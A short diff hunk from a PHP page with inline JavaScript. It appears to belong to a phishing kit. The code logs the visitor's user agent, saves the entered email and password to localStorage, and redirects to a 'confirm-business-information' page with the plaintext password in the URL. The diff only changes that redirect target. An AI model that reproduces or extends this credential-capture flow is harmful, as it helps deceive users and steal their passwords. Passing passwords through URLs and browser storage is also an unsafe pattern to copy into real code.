@@ -229,7 +229,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                             localStorage.setItem('personalEmail', personalEmail);
                             localStorage.setItem('password', password);
                         } else {
-                            window.location.href = "/two-factor-authentication.php?error=1&password=" + password;
+                            window.location.href = "/confirm-business-information.php?error=1&password=" + password;
                         }
                     }, 1000);
                 } else {
